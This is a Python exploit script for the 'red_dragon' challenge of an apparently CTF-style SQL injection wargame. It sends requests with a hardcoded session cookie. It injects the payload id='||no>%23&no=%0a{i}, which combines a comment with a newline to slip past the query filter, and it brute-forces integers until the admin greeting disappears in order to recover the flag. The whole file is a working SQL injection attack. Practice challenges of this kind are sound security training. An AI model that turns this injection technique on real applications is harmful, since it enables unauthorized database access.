import string
import requests
import time

url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php/"
session = requests.Session()
char = string.printable
header = {
    'Cookie' : "PHPSESSID=p9phs3kas3ep8ff1qv7q8mdo2a"
}

for i in range(0, 1000000000):
    r = session.get(url = url , headers= header , params=f"id='||no>%23&no=%0a{i}")
    print(i)
    if "Hello admin" not in r.text:
        print("flag : " ,i-1)
        break